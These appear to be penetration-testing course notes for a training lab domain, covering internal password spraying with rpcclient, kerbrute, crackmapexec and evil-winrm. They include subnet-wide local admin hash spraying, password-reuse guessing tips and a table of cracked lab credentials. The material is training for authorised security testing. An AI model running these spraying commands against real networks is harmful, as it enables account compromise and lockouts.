# Section 11 — Internal Password Spraying from Linux

## Prerequisites
- Valid user list (from Section 10)
- Password policy confirmed (from Section 9)
- One or more candidate passwords

---

## Method 1 — rpcclient Bash One-Liner

```bash
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

**How to read output:**
- `Authority Name: INLANEFREIGHT` = successful login
- No output = failed login

grep for `Authority` filters out all failures automatically.

---

## Method 2 — Kerbrute Password Spray

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

- Faster than rpcclient
- Uses Kerberos — failed attempts DO count toward lockout threshold
- Clean output — only shows valid hits

---

## Method 3 — CrackMapExec (preferred — most output detail)

```bash
# Spray one password against user list — grep + to show only successes
crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# Validate a hit
crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

Always pipe through `| grep +` — filters logon failures, shows only valid logins.

---

## Local Administrator Password Reuse

If you recover a local admin NTLM hash or cleartext password, spray it across the subnet:

```bash
# Spray local admin hash across entire subnet
# --local-auth = only try once per host, prevents domain account lockout
crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H NTLM_HASH | grep +

# Pwn3d! in output = local admin access confirmed
```

**Why this works:** Gold image deployments often set the same local admin password across all hosts.

**Naming pattern tips:**
- `$desktop%@admin123` on a workstation → try `$server%@admin123` on servers
- Local account `bsmith` → try same password for domain account `bsmith`
- Domain user `ajones` → try same password for `ajones_adm`
- Valid creds in Domain A → test against same username in Domain B (trust relationships)

**Remediation:** Microsoft LAPS — AD manages unique rotating local admin passwords per host.

> **Stealth note:** Subnet-wide local admin spraying is very noisy — avoid during evasive assessments.

---

## Full Attack Workflow

```bash
# 1. Build user list (Section 10)
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o valid_users.txt

# 2. Check password policy (Section 9)
crackmapexec smb 172.16.5.5 -u wley -p 'transporter@4' --pass-pol

# 3. Spray (one password at a time, wait between rounds)
crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +

# 4. Validate hit
crackmapexec smb 172.16.5.5 -u avazquez -p Password123

# 5. Test hit against other services
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --shares
evil-winrm -i 172.16.5.5 -u avazquez -p Password123
```

---

## Lab Results (INLANEFREIGHT.LOCAL)

| Account | Password | Found By |
|---------|----------|----------|
| avazquez | `Password123` | crackmapexec spray |
| sgage | `Welcome1` | crackmapexec spray (confirmed manually) |
| tjohnson | `Welcome1` | crackmapexec spray |

---

## Exam Notes

- `| grep +` with crackmapexec = only shows successes, essential for large lists
- `--local-auth` flag is critical when spraying local admin hashes — prevents domain lockout
- `Pwn3d!` in crackmapexec output = local admin access
- Valid spray hit → immediately test against SMB shares, WinRM, RDP, MSSQL
- Always log: time, date, accounts targeted, password used
